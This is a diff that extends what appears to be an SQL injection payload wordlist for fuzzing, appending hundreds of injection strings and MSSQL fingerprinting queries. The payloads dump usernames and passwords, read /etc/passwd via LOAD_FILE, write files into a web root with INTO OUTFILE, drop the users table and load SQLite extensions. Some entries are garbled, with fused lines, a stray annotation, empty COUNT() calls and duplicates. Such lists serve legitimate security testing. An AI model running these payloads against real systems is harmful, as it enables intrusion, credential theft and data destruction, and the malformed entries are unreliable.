@@ -307,7 +307,6 @@ waitfor delay '0:0:20' --
 ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
 ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
 ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
-# info disclosure payload fuzzfile for pgsql
 select version(); 
 select current_database();
 select current_user;
@@ -944,4 +943,462 @@ x' AND userid IS NULL; --
 x' or 1=1 or 'x'='y
 x' OR full_name LIKE '%Bob%
 ý or 1=1 --
+' UNION SELECT @@hostname --
+' UNION SELECT USER() --
+(for current user)
+NULL OR 1=1--
+NULL OR 'a'='a'--
+NULL UNION SELECT 1--
+NULL UNION SELECT NULL--
+NULL OR (SELECT 1)=1--
+NULL OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--
+NULL OR (SELECT LENGTH(DATABASE()))>0--
+NULL UNION SELECT VERSION()--
+NULL OR @@version IS NOT NULL--
+NULL OR CHAR(65)='A'--
+NULL UNION SELECT USER()--
+NULL OR (SELECT SUBSTRING(DATABASE(),1,1))='a'--
+NULL OR ASCII(SUBSTRING(DATABASE(),1,1))>0--
+NULL OR (SELECT TOP 1 NAME FROM SYSOBJECTS WHERE XTYPE='U')>''--
+NULL UNION SELECT @@SERVERNAME--
+NULL OR (SELECT SYSTEM_USER) IS NOT NULL--
+NULL UNION SELECT CURRENT_USER--
+NULL OR (SELECT DB_NAME()) IS NOT NULL--
+NULL UNION SELECT @@VERSION--
+NULL OR (SELECT HOST_NAME()) IS NOT NULL--
+NULL OR 1=1 AND '1'='1'--
+NULL UNION SELECT NULL,NULL--
+NULL OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES)--
+NULL OR (SELECT TOP 1 SUBSTRING(NAME,1,1) FROM SYSOBJECTS WHERE XTYPE='U')>'A'--
+NULL UNION SELECT @@SPID--
+NULL OR (SELECT SERVERPROPERTY('ProductVersion')) IS NOT NULL--
+NULL UNION SELECT SYSTEM_USER--
+NULL OR (SELECT TOP 1 NAME FROM MASTER..SYSDATABASES)>''--
+NULL UNION SELECT HOST_NAME()--
+NULL OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS)>0--
+NULL OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--
+NULL UNION SELECT COALESCE(NULL,1)--
+NULL OR (SELECT IIF(1=1,1,0))=1--
+NULL UNION SELECT CHOOSE(1,NULL,'a','b')--
+NULL OR (SELECT CONVERT(VARCHAR, SERVERPROPERTY('Edition'))) IS NOT NULL--
+NULL UNION SELECT CAST(1 AS VARCHAR)--
+' OR '1'='1 ' OR 1=1--
+' UNION SELECT NULL-- 
+' UNION SELECT 1,2,3-- 
+') OR ('1'='1 1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' UNION SELECT NULL,NULL,NULL-- 
+1' UNION SELECT @@version-- 
+' HAVING 1=1-- 
+' GROUP BY columnnames HAVING 1=1-- 
+' UNION ALL SELECT 1,2,3,4-- 
+' UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+' OR 'unusual' = 'unusual'-- 
+' OR 'something' = 'some'+'thing'-- 
+' OR 'text' = N'text'-- 
+' OR 'something' like 'some%'-- 
+' OR 2 > 1-- 
+' OR 'text' > 't'-- 
+' OR 'whatever' IN ('whatever')-- 
+' OR 2 BETWEEN 1 AND 3-- 
+' OR username IS NOT NULL-- 
+' UNION SELECT sum(columnname) from tablename-- 
+-1' UNION SELECT 1,2,3-- 
+' UNION SELECT * FROM users-- 
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- 
+1' ORDER BY 10-- 
+1' ORDER BY 11-- 
+1' ORDER BY 12-- 
+1' ORDER BY 13-- 
+1' ORDER BY 14-- 
+1' ORDER BY 15-- 
+1' ORDER BY 16-- 
+1' ORDER BY 17-- 
+1' ORDER BY 18-- 
+1' ORDER BY 19-- 
+1' ORDER BY 20-- 
+1' ORDER BY 21-- 
+1' ORDER BY 22-- 
+1' ORDER BY 23-- 
+1' ORDER BY 24-- 
+1' ORDER BY 25-- 
+1' ORDER BY 26-- 
+1' ORDER BY 27-- 
+1' ORDER BY 28-- 
+1' ORDER BY 29-- 
+1' ORDER BY 30-- 
+1' ORDER BY 31-- 
+1' ORDER BY 32-- 
+1' ORDER BY 33-- 
+1' ORDER BY 34-- 
+1' ORDER BY 35-- 
+1' ORDER BY 36-- 
+1' ORDER BY 37-- 
+1' ORDER BY 38-- 
+1' ORDER BY 39-- 
+1' ORDER BY 40-- 
+1' ORDER BY 41-- 
+1' ORDER BY 42-- 
+1' ORDER BY 43-- 
+1' UNION SELECT NULL-- 
+1' UNION SELECT NULL,NULL-- 
+1' UNION SELECT NULL,NULL,NULL-- 
+1' UNION SELECT NULL,NULL,NULL,NULL-- 
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL-- 
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+1' UNION SELECT @@version-- 
+1' UNION SELECT @@version,NULL-- 
+1' UNION SELECT @@version,NULL,NULL-- 
+1' UNION SELECT @@version,NULL,NULL,NULL-- 
+1' UNION SELECT @@version,NULL,NULL,NULL,NULL-- 
+1' UNION SELECT NULL,@@version-- 
+1' UNION SELECT NULL,NULL,@@version-- 
+1' UNION SELECT NULL,NULL,NULL,@@version-- 
+1' UNION SELECT NULL,NULL,NULL,NULL,@@version-- 
+' UNION SELECT username,password FROM users-- 
+' UNION SELECT NULL,username||'-'||password FROM users-- 
+' UNION SELECT NULL,NULL,username||'-'||password FROM users-- 
+' UNION SELECT NULL,NULL,NULL,username||'-'||password FROM users-- 
+' UNION SELECT NULL,NULL,NULL,NULL,username||'-'||password FROM users-- 
+' UNION SELECT * FROM users WHERE username LIKE '%admin%'-- 
+' UNION SELECT * FROM users WHERE username LIKE 'admin%'-- 
+' UNION SELECT * FROM users WHERE username = 'admin'-- 
+' UNION SELECT * FROM users WHERE username = 'administrator'-- 
+' UNION SELECT * FROM users WHERE username = 'root'-- 
+' UNION SELECT * FROM users WHERE id = 1-- 
+' UNION SELECT * FROM users WHERE id = 2-- 
+' UNION SELECT * FROM users WHERE id = 3-- 
+' UNION SELECT * FROM users WHERE id = 4-- 
+' UNION SELECT * FROM users WHERE id = 5-- 
+' UNION SELECT TOP 1 * FROM users-- 
+' UNION SELECT TOP 2 * FROM users-- 
+' UNION SELECT TOP 3 * FROM users-- 
+' UNION SELECT TOP 4 * FROM users-- 
+' UNION SELECT TOP 5 * FROM users-- 
+' UNION SELECT id, username, password FROM users-- 
+' UNION SELECT username, password, email FROM users-- 
+' UNION SELECT id, username, email FROM users-- 
+' UNION SELECT id, username, created_at FROM users-- 
+' UNION SELECT id, username, last_login FROM users-- 
+' UNION SELECT COUNT() FROM users-- 
+' UNION SELECT COUNT(id) FROM users-- 
+' UNION SELECT COUNT(username) FROM users-- 
+' UNION SELECT COUNT(password) FROM users-- 
+' UNION SELECT COUNT(email) FROM users-- 
+' UNION SELECT SUM(id) FROM users-- 
+' UNION SELECT AVG(id) FROM users-- 
+' UNION SELECT MIN(id) FROM users-- 
+' UNION SELECT MAX(id) FROM users-- 
+' UNION SELECT DISTINCT username FROM users-- 
+' UNION SELECT DISTINCT password FROM users-- 
+' UNION SELECT DISTINCT email FROM users-- 
+' UNION SELECT TOP 1 username FROM users ORDER BY id DESC-- 
+' UNION SELECT TOP 1 password FROM users ORDER BY id DESC-- 
+' UNION SELECT TOP 1 email FROM users ORDER BY id DESC-- 
+' UNION SELECT * FROM users LIMIT 1-- 
+' UNION SELECT * FROM users LIMIT 1,1-- 
+' UNION SELECT * FROM users LIMIT 2,1-- 
+' UNION SELECT * FROM users LIMIT 3,1-- 
+' UNION SELECT * FROM users LIMIT 4,1-- 
+' UNION SELECT * FROM users LIMIT 5,1-- 
+' UNION SELECT * FROM users LIMIT 1 OFFSET 1-- 
+' UNION SELECT * FROM users LIMIT 1 OFFSET 2-- 
+' UNION SELECT * FROM users LIMIT 1 OFFSET 3-- 
+' UNION SELECT * FROM users LIMIT 1 OFFSET 4-- 
+' UNION SELECT * FROM users LIMIT 1 OFFSET 5-- 
+' OR 1=1 LIMIT 1-- 
+' OR 1=1 LIMIT 2-- 
+' OR 1=1 LIMIT 3-- 
+' OR 1=1 LIMIT 4-- 
+' OR 1=1 LIMIT 5-- 
+' OR 1=1 LIMIT 1,1-- 
+' OR 1=1 LIMIT 2,1-- 
+' OR 1=1 LIMIT 3,1-- 
+' OR 1=1 LIMIT 4,1-- 
+' OR 1=1 LIMIT 5,1-- 
+' OR 1=1 ORDER BY 1-- 
+' OR 1=1 ORDER BY 2-- 
+' OR 1=1 ORDER BY 3-- 
+' OR 1=1 ORDER BY 4-- 
+' OR 1=1 ORDER BY 5-- 
+' OR 1=1 ORDER BY 6-- 
+' OR 1=1 ORDER BY 7-- 
+' OR 1=1 ORDER BY 8-- 
+' OR 1=1 ORDER BY 9-- 
+' OR 1=1 ORDER BY 10-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+' AND 1=1-- 
+' AND 1=2-- 
+' OR 'a'='a ' OR 'a'='b ' AND 'a'='a ' AND 'a'='b '=' ' LIKE '% ' OR username LIKE '%admin%'-- 
+' AND username LIKE '%admin%'-- 
+' OR username='admin'-- 
+' AND username='admin'-- 
+' OR userid=1-- 
+' AND userid=1-- 
+' GROUP BY userid-- 
+' HAVING 1=1-- 
+' HAVING 'a'='a ' HAVING 'a'='b ' AND 1=(SELECT COUNT() FROM tablenames)-- 
+' AND 1=(SELECT COUNT() FROM tablenames)-- 
+' UNION ALL SELECT 1,2,3,4,5,6,name FROM sysobjects WHERE xtype='U'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,name FROM sysobjects WHERE xtype='U'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,sql FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,sql FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(sql) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(sql) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,txtquery FROM sqlite_temp_master UNION ALL SELECT * FROM sqlite_master-- 
+' UNION ALL SELECT 1,2,3,4,5,6,txtquery FROM sqlite_temp_master UNION ALL SELECT * FROM sqlite_master-- 
+' UNION ALL SELECT 1,2,3,4,5,6,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,sql FROM sqlite_master WHERE type='table' AND name='users'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,sql FROM sqlite_master WHERE type='table' AND name='users'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name) FROM sqlite_master WHERE type='table'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name) FROM sqlite_master WHERE type='table'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name||': '||sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name||': '||sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name||'('||type||')') FROM sqlite_master WHERE type='table' OR type='view' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name||'('||type||')') FROM sqlite_master WHERE type='table' OR type='view' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name||'('||type||'):'||sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(name||'('||type||'):'||sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name NOT LIKE 'sqliteadmin_%'-- 
+' UNION ALL SELECT 1,2,3,4,5,6, FROM users-- 
+' UNION ALL SELECT 1,2,3,4,5,6,* FROM users-- 
+' UNION ALL SELECT 1,2,3,4,5,6,username||':'||password FROM users-- 
+' UNION ALL SELECT 1,2,3,4,5,6,username||':'||password FROM users-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(username||':'||password) FROM users-- 
+' UNION ALL SELECT 1,2,3,4,5,6,group_concat(username||':'||password) FROM users-- 
+' UNION ALL SELECT 1,2,3,4,5,6,load_extension(char(47)||char(116)||char(109)||char(112)||char(47)||char(120)) FROM sqlite_master LIMIT 1-- 
+' UNION ALL SELECT 1,2,3,4,5,6,load_extension(char(47)||char(116)||char(109)||char(112)||char(47)||char(120)) FROM sqlite_master LIMIT 1-- 
+' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC)-- 
+' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC)-- 
+' WAITFOR DELAY '0:0:5'-- 
+' WAITFOR DELAY '0:0:5'-- 
+' OR 1=1--
+' OR 1=1# 
+' OR 1=1/*
+' OR '1'='1 
+' OR '1'='1'-- 
+' OR '1'='1'# 
+' OR '1'='1'/* 
+' OR '1'='1' -- 
+' OR '1'='1' # 
+' OR '1'='1' /* 
+'OR 1=1 
+'OR 1=1-- 
+'OR 1=1# 
+'OR 1=1/* 
+' OR 1=1 LIMIT 1-- 
+' OR 1=1; DROP TABLE users-- 
+' UNION SELECT @@version-- 
+' UNION SELECT LOAD_FILE('/etc/passwd')-- 
+' INTO OUTFILE '/var/www/html/output.txt' 
+' UNION SELECT * FROM information_schema.tables-- 
+' AND (SELECT COUNT(*) FROM sysobjects)>0-- 
+' AND (SELECT * FROM (SELECT
+CONCAT('DB: ', DATABASE())
+CONCAT('User: ', USER())
+CONCAT('Host: ', @@HOSTNAME)
+SELECT IFNULL(DATABASE(), 'No DB')
+COALESCE(CURRENT_USER(), 'Unknown')
+CASE WHEN @@HOSTNAME IS NOT NULL THEN @@HOSTNAME ELSE 'Unknown' END
+SUBSTRING(DATABASE(), 1, 10)
+LEFT(USER(), 20)
+RIGHT(@@HOSTNAME, 15)
+CHAR(68,66,58) + DATABASE()
+(SELECT TOP 1 name FROM sys.databases)
+SYSTEM_USER
+HOST_NAME()
+DB_NAME()
+SERVERPROPERTY('MachineName')
+SELECT DB_NAME()
+SELECT CURRENT_USER
+SELECT @@SERVERNAME
+SELECT SYSTEM_USER
+SELECT HOST_NAME()
+SELECT SUSER_SNAME()
+SELECT SUSER_NAME()
+SELECT USER_NAME()
+SELECT ORIGINAL_LOGIN()
+SELECT CONNECTIONPROPERTY('local_net_address')
+SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS')
+SELECT SERVERPROPERTY('InstanceName')
+SELECT @@VERSION
+SELECT @@LANGUAGE
+SELECT @@SERVICENAME
+SELECT name FROM sys.databases WHERE database_id = 1
+SELECT name FROM sys.servers WHERE server_id = 0
+SELECT SERVERPROPERTY('ProductVersion')
+SELECT SERVERPROPERTY('ProductLevel')
+SELECT SERVERPROPERTY('Edition')
+SELECT CONVERT(VARCHAR(128), SERVERPROPERTY('Collation'))
+SELECT DB_NAME() + '|' + CURRENT_USER
+SELECT CONCAT(DB_NAME(), ':', SYSTEM_USER)
+SELECT COALESCE(DB_NAME(), 'Unknown') AS DBName
+SELECT ISNULL(CURRENT_USER, 'N/A') AS CurrentUser
+SELECT CASE WHEN DB_NAME() IS NOT NULL THEN DB_NAME() ELSE 'NoDB' END
+SELECT IIF(SUSER_SNAME() != '', SUSER_SNAME(), 'NoUser')
+SELECT SUBSTRING(@@SERVERNAME, 1, 10) + '...'
+SELECT LEFT(DB_NAME(), 5) + RIGHT(DB_NAME(), 5)
+SELECT UPPER(DB_NAME())
+SELECT LOWER(CURRENT_USER)
+SELECT REVERSE(DB_NAME())
+SELECT STUFF(DB_NAME(), 2, 1, '')
+SELECT REPLACE(DB_NAME(), 'A', '@')
+SELECT LTRIM(RTRIM(DB_NAME()))
+SELECT CHAR(72) + CHAR(79) + CHAR(83) + CHAR(84) + CHAR(58) + HOST_NAME()
+SELECT ASCII(LEFT(DB_NAME(), 1))
+SELECT LEN(DB_NAME())
+SELECT DATALENGTH(CURRENT_USER)
+SELECT CHARINDEX('a', LOWER(DB_NAME()))
+SELECT PATINDEX('%s%', LOWER(DB_NAME()))
+SELECT SOUNDEX(DB_NAME())
+SELECT DIFFERENCE(DB_NAME(), 'Test')
+SELECT QUOTENAME(DB_NAME())
+SELECT FORMAT(GETDATE(), 'yyyy-MM-dd') + '|' + DB_NAME()
+SELECT CONCAT_WS('|', DB_NAME(), CURRENT_USER, @@SERVERNAME)
+SELECT STRING_AGG(name, ',') FROM sys.databases
+SELECT STRING_SPLIT(CONCAT(DB_NAME(), ',', CURRENT_USER), ',')
+SELECT JSON_VALUE('{"db":"' + DB_NAME() + '"}', '$.db')
+SELECT TRY_CONVERT(VARCHAR(50), DB_NAME())
+SELECT TRIM('' FROM '' + DB_NAME() + '')
+SELECT IIF(ISDATE(GETDATE()) = 1, DB_NAME(), 'Error')
+SELECT COALESCE(NULLIF(DB_NAME(), ''), 'Empty')
+SELECT CHOOSE(1, DB_NAME(), CURRENT_USER, @@SERVERNAME)
+SELECT IIF(DB_NAME() LIKE '%t%', DB_NAME(), 'No T')
+SELECT TRANSLATE(DB_NAME(), 'AEI', '123')
+SELECT STRING_ESCAPE(DB_NAME(), 'json')
+SELECT CONCAT(LEFT(DB_NAME(), 3), '...', RIGHT(DB_NAME(), 3))
+SELECT REPLICATE(LEFT(DB_NAME(), 1), 5)
+SELECT SPACE(5) + DB_NAME() + SPACE(5)
+SELECT 'DB-' + CAST(DB_NAME() AS VARCHAR(50))
+SELECT CONVERT(VARBINARY(50), DB_NAME())
+SELECT CONVERT(VARCHAR(50), CONNECTIONPROPERTY('protocol_type'))
+SELECT CASE DB_NAME() WHEN 'master' THEN 'Main' ELSE 'Other' END
+SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')
+SELECT @@SPID
+SELECT @@LOCK_TIMEOUT
+SELECT @@MAX_CONNECTIONS
+SELECT @@TRANCOUNT
+SELECT FULLTEXTSERVICEPROPERTY('IsFullTextInstalled')
+SELECT SERVERPROPERTY('IsClustered')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Status')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Recovery')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Updateability')
+SELECT OBJECT_ID('sys.databases')
+SELECT APP_NAME()
+SELECT CONTEXT_INFO()
+SELECT SESSION_USER
+SELECT CURRENT_TIMESTAMP
+SELECT CONNECTIONPROPERTY('client_net_address')
+SELECT CONNECTIONPROPERTY('auth_scheme')
+SELECT ORIGINAL_DB_NAME()
+SELECT SCHEMA_NAME()
+SELECT SCHEMA_ID()
+SELECT DB_ID()
+SELECT FILE_NAME(1)
+SELECT FILE_IDEX(1)
+SELECT FILEGROUP_NAME(1)
+SELECT FILEGROUP_ID('PRIMARY')
+SELECT FILEPROPERTYEX(1, 'LogicalName')
+SELECT TYPEPROPERTY(DB_NAME(), 'PRECISION')
+SELECT TYPEPROPERTY(DB_NAME(), 'SCALE')
+SELECT TYPEPROPERTY(DB_NAME(), 'COLLATION')
+SELECT OBJECT_NAME(OBJECT_ID('sys.databases'))
+SELECT OBJECTPROPERTY(OBJECT_ID('sys.databases'), 'BaseType')
+SELECT OBJECTPROPERTYEX(OBJECT_ID('sys.databases'), 'IsTable')
+SELECT COL_LENGTH('sys.databases', 'name')
+SELECT COL_NAME(OBJECT_ID('sys.databases'), 1)
+SELECT INDEX_COL('sys.databases', 1, 1)
+SELECT INDEXPROPERTY(OBJECT_ID('sys.databases'), 'PK__sysdata__', 'IndexDepth')
+SELECT STATS_DATE(OBJECT_ID('sys.databases'), 1)
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Collation')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Edition')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsAutoShrink')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsAutoCreateStatistics')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsAutoUpdateStatistics')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsPublished')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsSubscribed')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsMergePublished')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsDistributor')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsFulltextEnabled')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsTruncLog')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsInStandBy')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsLocalCursorsDefault')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsQuotedIdentifiersEnabled')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsNumericRoundAbortEnabled')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsRecursiveTriggersEnabled')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsPublished')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'IsSyncWithBackup')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'ServiceObjective')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'UserAccess')
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Version')
+SELECT SERVERPROPERTY('BuildClrVersion')
+SELECT SERVERPROPERTY('Collation')
+SELECT SERVERPROPERTY('CollationID')
+SELECT SERVERPROPERTY('ComparisonStyle')
+SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS')
+SELECT SERVERPROPERTY('EngineEdition')
+SELECT SERVERPROPERTY('HadrManagerStatus')
+SELECT SERVERPROPERTY('InstanceDefaultDataPath')
+SELECT SERVERPROPERTY('InstanceDefaultLogPath')
+SELECT SERVERPROPERTY('InstanceName')
+SELECT SERVERPROPERTY('IsClustered')
+SELECT SERVERPROPERTY('IsFullTextInstalled')
+SELECT SERVERPROPERTY('IsHadrEnabled')
+SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')
+SELECT SERVERPROPERTY('IsLocalDB')
+SELECT SERVERPROPERTY('IsSingleUser')
+SELECT SERVERPROPERTY('IsXTPSupported')
+SELECT SERVERPROPERTY('LCID')
+SELECT SERVERPROPERTY('LicenseType')
+SELECT SERVERPROPERTY('MachineName')
+SELECT SERVERPROPERTY('NumLicenses')
+SELECT SERVERPROPERTY('ProcessID')
+SELECT SERVERPROPERTY('ProductLevel')
+SELECT SERVERPROPERTY('ProductMajorVersion')
+SELECT SERVERPROPERTY('ProductMinorVersion')
+SELECT SERVERPROPERTY('ProductUpdateLevel')
+SELECT SERVERPROPERTY('ProductUpdateReference')
+SELECT SERVERPROPERTY('ResourceLastUpdateDateTime')
+SELECT SERVERPROPERTY('ResourceVersion')
+SELECT SERVERPROPERTY('ServerName')
+SELECT SERVERPROPERTY('SqlCharSet')
+SELECT SERVERPROPERTY('SqlCharSetName')
+SELECT SERVERPROPERTY('SqlSortOrder')
+SELECT SERVERPROPERTY('SqlSortOrderName')
+SELECT DB_NAME() + REPLICATE('', 10)
+SELECT STUFF(DB_NAME(), 2, 100, '...')
+SELECT 'DB: ' + QUOTENAME(DB_NAME(), '[]')
+SELECT CONVERT(VARCHAR(50), HASHBYTES('SHA2_256', DB_NAME()), 2)
+SELECT CONCAT('Server: ', @@SERVERNAME, ' | DB: ', DB_NAME())
+SELECT JSON_MODIFY('{}', '$.database', DB_NAME())
+SELECT TRIM(TRANSLATE(DB_NAME(), 'AEIOU', '_____'))
+SELECT IIF(DB_NAME() = 'master', 'Main Database', 'Other: ' + DB_NAME())
+SELECT CONVERT(VARCHAR(50), CAST(DB_NAME() AS VARBINARY(50)), 1)
+SELECT FORMAT(CAST(DB_NAME() AS VARBINARY(50)), 'X')
+SELECT STRING_SPLIT(CONCAT(DB_NAME(), ',', CURRENT_USER, ',', @@SERVERNAME), ',')
+SELECT TRY_CAST(DB_NAME() AS INT)
+SELECT ISNULL(NULLIF(DB_NAME(), 'master'), 'Not Master')
+SELECT COALESCE(DB_NAME(), CURRENT_USER, @@SERVERNAME, 'Unknown')
+SELECT IIF(CHARINDEX('m', LOWER(DB_NAME())) > 0, 'Contains m', 'No m') + ': ' + DB_NAME()
+SELECT SUBSTRING(DB_NAME(), 1, CHARINDEX('', DB_NAME() + '') - 1)
+SELECT REVERSE(STUFF(REVERSE(DB_NAME()), 1, 1, ''))
+SELECT UPPER(LEFT(DB_NAME(), 1)) + LOWER(SUBSTRING(DB_NAME(), 2, LEN(DB_NAME())))
+SELECT REPLACE(TRANSLATE(DB_NAME(), 'AEIOU', '12345'), ' ', '_')
+SELECT CONCAT(LEFT(DB_NAME(), 3), REPLICATE('', LEN(DB_NAME()) - 6), RIGHT(DB_NAME(), 3))
+ 
+ 
 
